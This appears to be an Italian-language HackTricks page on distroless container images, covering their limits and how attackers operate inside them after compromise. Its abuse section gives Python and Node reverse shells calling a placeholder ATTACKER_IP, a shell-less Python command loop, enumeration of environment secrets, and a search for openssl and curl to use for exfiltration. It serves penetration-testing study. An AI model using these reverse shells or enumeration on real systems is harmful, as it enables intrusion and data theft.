# Contenitori Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un'immagine container **distroless** è un'immagine che fornisce i **componenti runtime minimi necessari per eseguire una specifica applicazione**, rimuovendo intenzionalmente gli strumenti tipici di una distribution come package manager, shell e grandi insiemi di utilità userland generiche. In pratica, le immagini distroless spesso contengono solo il binario o il runtime dell'applicazione, le sue librerie condivise, i bundle di certificati e una struttura di filesystem molto ridotta.

Il punto non è che distroless sia una nuova primitiva di isolamento del kernel. Distroless è una **strategia di design dell'immagine**. Cambia ciò che è disponibile **all'interno** del filesystem del container, non il modo in cui il kernel isola il container. Questa distinzione è importante, perché distroless indurisce l'ambiente principalmente riducendo ciò che un attaccante può usare dopo aver ottenuto code execution. Non sostituisce namespaces, seccomp, capabilities, AppArmor, SELinux, o qualsiasi altro meccanismo di isolamento a runtime.

## Perché esistono le immagini Distroless

Le immagini distroless sono usate principalmente per ridurre:

- la dimensione dell'immagine
- la complessità operativa dell'immagine
- il numero di pacchetti e binari che potrebbero contenere vulnerabilità
- il numero di tool di post-exploitation disponibili a un attaccante di default

Per questo le immagini distroless sono popolari nei deploy di applicazioni in produzione. Un container che non contiene shell, package manager e quasi nessun tooling generico è in genere più semplice da gestire operativamente e più difficile da abusare in modo interattivo dopo una compromissione.

Esempi di famiglie di immagini in stile distroless ben note includono:

- Google's distroless images
- Chainguard hardened/minimal images

## Cosa non significa Distroless

Un container distroless **non è**:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protetto da seccomp, AppArmor, o SELinux
- automaticamente sicuro da container escape

È comunque possibile eseguire un'immagine distroless con `--privileged`, con condivisione dei namespace dell'host, mount pericolosi, o con un socket runtime montato. In quello scenario, l'immagine può essere minimale, ma il container può comunque essere catastroficamente insicuro. Distroless cambia la superficie d'attacco userland, non il confine di fiducia del kernel.

## Caratteristiche operative tipiche

Quando comprometti un container distroless, la prima cosa che noti di solito è che alcune assunzioni comuni smettono di essere vere. Potrebbe non esserci `sh`, né `bash`, né `ls`, né `id`, né `cat`, e talvolta neppure un ambiente basato su libc che si comporti come il solito tradecraft si aspetta. Questo influisce sia sull'offense che sulla defense, perché la mancanza di tooling rende debugging, incident response e post-exploitation diversi.

I pattern più comuni sono:

- il runtime dell'applicazione è presente, ma poco altro
- payload basati su shell falliscono perché non esiste una shell
- one-liner di enumerazione comuni falliscono perché mancano i binari helper
- protezioni del file system come rootfs read-only o `noexec` su posizioni tmpfs scrivibili sono spesso presenti

Questa combinazione è ciò che di solito porta le persone a parlare di "weaponizing distroless".

## Distroless e Post-Exploitation

La principale sfida offensiva in un ambiente distroless non è sempre l'RCE iniziale. Spesso è ciò che segue. Se il workload sfruttato fornisce code execution in un language runtime come Python, Node.js, Java, o Go, potresti essere in grado di eseguire logica arbitraria, ma non attraverso i normali workflow centrati sulla shell che sono comuni in altri target Linux.

Ciò significa che il post-exploitation spesso si sposta in una di tre direzioni:

1. **Usare direttamente il language runtime esistente** per enumerare l'ambiente, aprire socket, leggere file o staging di payload aggiuntivi.
2. **Portare il proprio tooling in memoria** se il filesystem è read-only o le locazioni scrivibili sono montate `noexec`.
3. **Abusare dei binari esistenti già presenti nell'immagine** se l'applicazione o le sue dipendenze includono qualcosa inaspettatamente utile.

## Abuse

### Enumerare il runtime già disponibile

In molti container distroless non c'è una shell, ma c'è comunque un application runtime. Se il target è un servizio Python, Python è presente. Se il target è Node.js, Node è presente. Questo spesso fornisce funzionalità sufficienti per enumerare file, leggere variabili d'ambiente, aprire reverse shell e effettuare esecuzione in-memory senza invocare mai `/bin/sh`.

Un semplice esempio con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un semplice esempio con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impatto:

- recupero delle variabili d'ambiente, spesso incluse credenziali o endpoint di servizio
- enumerazione del filesystem senza `/bin/ls`
- identificazione dei percorsi scrivibili e dei mounted secrets

### Reverse Shell Without `/bin/sh`

Se l'immagine non contiene `sh` o `bash`, un classico reverse shell basato sulla shell può fallire immediatamente. In tal caso, usa il runtime del linguaggio installato.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` non esiste, sostituisci l'ultima riga con l'esecuzione diretta di comandi tramite Python o con un loop REPL di Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ancora, se `/bin/sh` è assente, usa direttamente le API di filesystem, process e networking di Node invece di avviare una shell.

### Esempio completo: loop di comandi Python senza shell

Se l'immagine contiene Python ma non ha affatto una shell, un semplice ciclo interattivo è spesso sufficiente per mantenere piena capacità di post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Questo non richiede un interactive shell binary. L'impatto è di fatto lo stesso di una basic shell dal punto di vista dell'attacker: command execution, enumeration, and staging of further payloads through the existing runtime.

### Esecuzione in memoria degli strumenti

Le immagini Distroless sono spesso combinate con:

- `readOnlyRootFilesystem: true`
- tmpfs scrivibile ma con `noexec` come `/dev/shm`
- mancanza di strumenti di package management

Quella combinazione rende inaffidabili i classici workflow "download binary to disk and run it". In questi casi, le tecniche di esecuzione in memoria diventano la soluzione principale.

La pagina dedicata a ciò è:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Le tecniche più rilevanti presenti sono:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binari già presenti nell'immagine

Alcune immagini distroless contengono ancora binari necessari per l'operatività che diventano utili dopo la compromissione. Un esempio osservato ripetutamente è `openssl`, perché le applicazioni a volte ne hanno bisogno per operazioni legate a crypto o TLS.

Un pattern di ricerca rapido è:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` è presente, potrebbe essere utilizzabile per:

- connessioni TLS in uscita
- esfiltrazione di dati attraverso un canale di uscita consentito
- staging dei payload tramite blob codificati/crittografati

L'abuso esatto dipende da ciò che è effettivamente installato, ma l'idea generale è che distroless non significa "nessuno strumento in assoluto"; significa "molto meno strumenti rispetto a un'immagine di distribuzione normale".

## Controlli

Lo scopo di questi controlli è determinare se l'immagine è veramente distroless nella pratica e quali runtime o binari di supporto sono ancora disponibili per post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Quello che è interessante qui:

- Se non esiste una shell ma è presente un runtime come Python o Node, la post-exploitation dovrebbe pivotare verso l'esecuzione guidata dal runtime.
- Se il filesystem root è in sola lettura e `/dev/shm` è scrivibile ma `noexec`, le memory execution techniques diventano molto più rilevanti.
- Se binari helper come `openssl`, `busybox` o `java` sono presenti, possono offrire funzionalità sufficienti per ottenere accesso aggiuntivo.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Userland minimo per progettazione | Nessuna shell, nessun package manager, solo dipendenze dell'applicazione/runtime | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Userland minimo per progettazione | Superficie di pacchetti ridotta, spesso focalizzata su un solo runtime o servizio | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Dipende dalla configurazione del Pod | Distroless influisce solo sull'userland; la postura di sicurezza del Pod dipende ancora dalla Pod spec e dalle impostazioni di runtime predefinite | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Dipende dai run flags | Filesystem minimale, ma la sicurezza del runtime dipende ancora dai flag e dalla configurazione del daemon | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Il punto chiave è che distroless è una **proprietà dell'immagine**, non una protezione del runtime. Il suo valore deriva dal ridurre ciò che è disponibile all'interno del filesystem dopo un compromesso.

## Related Pages

Per filesystem e memory-execution bypasses comunemente necessari in ambienti distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Per l'abuso del runtime container, socket e mount che si applica ancora ai workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
